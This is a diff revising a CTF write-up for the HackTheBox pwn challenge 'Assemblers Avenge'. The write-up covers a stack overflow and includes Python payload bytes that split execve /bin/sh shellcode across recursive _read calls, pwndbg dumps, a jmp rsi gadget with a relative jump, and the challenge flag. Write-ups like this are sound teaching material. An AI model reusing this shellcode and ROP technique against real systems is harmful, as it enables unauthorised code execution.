@@ -1,10 +1,11 @@
-# HTB Distopia - PWN | Assemblers Avenge
+	# HTB Distopia - PWN | Assemblers Avenge
 
 This challenge involved adding shellcode to the stack through recursive ROP calls and executing that shellcode through a relative JMP instruction.
 
 ### Initial Analysis
 
-Looking at checksec:
+Looking at checksec there are no memory protections on the binary
+
 ```
 $ checksec assemblers_avenge
 	RELRO:    No RELRO
@@ -36,19 +37,19 @@ Taking a look through the binary, there is an obvious buffer overflow in the `_r
 The assembly above is equivalent to
 
 ``` c
-void read() {
+void _read() {
     char buffer[8];
     read(0, buffer, 0x18);
 }
 ```
 
-Now that the vulnerability has been discovered, the next step is to find a way to exploit it. There are two concerns when exploiting this:
+Now that the vulnerability has been discovered, the next step is to find a method to exploit it. There are two concerns when exploiting this:
 - the amount of data that can be written is 16 bytes (24 - 8)
-- need to know where the stack is
+- the address of the stack is unknown
 
 ### Exploitation
 
-Tackling the first issue is pretty simple and is through the use of recursively calling `_read`. Take this example of shellcode which is 24 bytes, since there is a limit of 16 bytes that can be written on the stack, there needs to be a way to get the rest of the shellcode on the stack. By placing the first 8 bytes of the shellcode, then setting the RIP back to `_read` it lets us exploit the same buffer overflow vulnerability again, while lowering where the stack pointer is. Essentially letting us write to the stack.
+Tackling the first issue is pretty simple through using recursive calls to `_read`. By setting RIP to `_read`, the buffer overflow vulnerability can be abused multiple times to make numerous write to the stack. Only 8 bytes can be written on the stack that don't get overriden, so shellcode with a payload size of 24 bytes will take 3 calls to `_read`.
 
 ``` python
 f_read = p64(0x40106d)
@@ -58,19 +59,50 @@ shell2 = b'\xbb\x2f\x62\x69\x6e\x2f\x73\x68'.ljust(0x10, b'A') + f_read
 shell3 = b'\x00\x53\x54\x5f\xb0\x3b\x0f\x05'.ljust(0x10, b'A') + f_read
 ```
 
-After running through the first `_read`
-[gdb]
+Breaking after the `read` syscall is done executing the first 8 bytes of the shellcode are loaded.
 
-After running through the second `_read`
-[]
+```
+pwndbg> x/20gx $rsp+0x8
+0x7ffc01dcf290:	0x48f63148d2314850	0x4141414141414141
+0x7ffc01dcf2a0:	0x000000000040106d	0x0000000000000000
+```
 
-Doing this multiple times, the shellcode should be loaded on the stack
+Load the second part of the shellcode.
 
-[show gdb with all of the shellcode on the stack]
+```
+pwndbg> x/20gx $rsp
+0x7ffd34e24560:	0x48f63148d2314850	0x68732f6e69622fbb
+0x7ffd34e24570:	0x4141414141414141	0x000000000040106d
+```
 
-The next step is finding a method of jumping to the top of the shellcode. This can be done through the gadget `0x40106b: jmp rsi;`. Since RSI stores the value of the buffer when `read()` is called, then once we overflow we can jump to where RSI is located. The issue here is that RSI does not contain the location of the shellcode, but of the current frame's buffer. Getting around this is pretty easy by using a relative jump.
+Load the third part of the shellcode.
 
-[excelidraw image of the double jump]
+```
+pwndbg> x/20gx $rsp-0x08
+0x7ffd34e24560:	0x48f63148d2314850	0x68732f6e69622fbb
+0x7ffd34e24570:	0x050f3bb05f545300	0x4141414141414141
+0x7ffd34e24580:	0x000000000040106d	0x0000000000000000
+```
+
+The complete shellcode should now be loaded to the stack
+
+```
+pwndbg> x/10i $rsp-0x8
+   0x7ffd34e24560:	push   rax
+   0x7ffd34e24561:	xor    rdx,rdx
+   0x7ffd34e24564:	xor    rsi,rsi
+   0x7ffd34e24567:	movabs rbx,0x68732f6e69622f
+   0x7ffd34e24571:	push   rbx
+   0x7ffd34e24572:	push   rsp
+   0x7ffd34e24573:	pop    rdi
+   0x7ffd34e24574:	mov    al,0x3b
+   0x7ffd34e24576:	syscall 
+   0x7ffd34e24578:	rex.B
+```
+
+The next step is finding a method of jumping to the top of the shellcode. This can be done through the gadget `0x40106b: jmp rsi;`. Since RSI stores the value of the buffer when `read()` is called, then it can also be used for jumping to the stack. The issue here is that RSI does not contain the location of the shellcode, but of the current buffer. Getting around this is pretty easy by using a relative jump instruction `jmp -0x1a`.
+
+![[img1.png]]
 
 Put these two pieces together to execute shellcode and get the flag!
 `HTB{y0ur_l0c4l_4553mbl3R5_4v3ng3d_066023bd8dc6109e6e4547497951c2ce}`
